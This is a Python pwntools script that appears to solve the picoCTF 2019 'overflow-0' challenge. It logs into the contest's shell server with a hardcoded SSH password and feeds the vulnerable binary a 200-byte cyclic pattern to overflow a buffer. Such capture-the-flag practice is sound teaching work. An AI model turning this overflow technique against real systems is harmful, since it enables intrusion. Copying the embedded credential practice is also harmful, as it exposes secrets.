from pwn import *
import argparse
import os

EXECUTABLE = "vuln"
LOCAL_PATH = "./"
REMOTE_PATH = "/problems/overflow-0_1_54d12127b2833f7eab9758b43e88d3b7/"
SSH_SERVER = "2019shell1.picoctf.com"

def get_process(ssh_user = None, arguments = None):
    if arguments is None:
        arguments = []
    if type(arguments) is not list:
        raise ValueError("Invalid type for 'arguments' ({}), expecting list or None".format(type(arguments)))
    if ssh_user is not None:
        s = ssh(host=SSH_SERVER, user=ssh_user , password = "d8e639cdbd03")
        p = s.process(argv = [REMOTE_PATH + EXECUTABLE] + arguments, cwd = REMOTE_PATH)
    elif os.path.exists(REMOTE_PATH):
        p = process(argv = [REMOTE_PATH + EXECUTABLE] + arguments, cwd = REMOTE_PATH)
    else:
        p = process(argv = [LOCAL_PATH + EXECUTABLE] + arguments, cwd = LOCAL_PATH)
    return p



parser = argparse.ArgumentParser()
parser.add_argument("-s", "--ssh_user", help="Connect via SSH with the given username")
args = parser.parse_args()

p = get_process(args.ssh_user, [cyclic(200)])
print p.recvall()
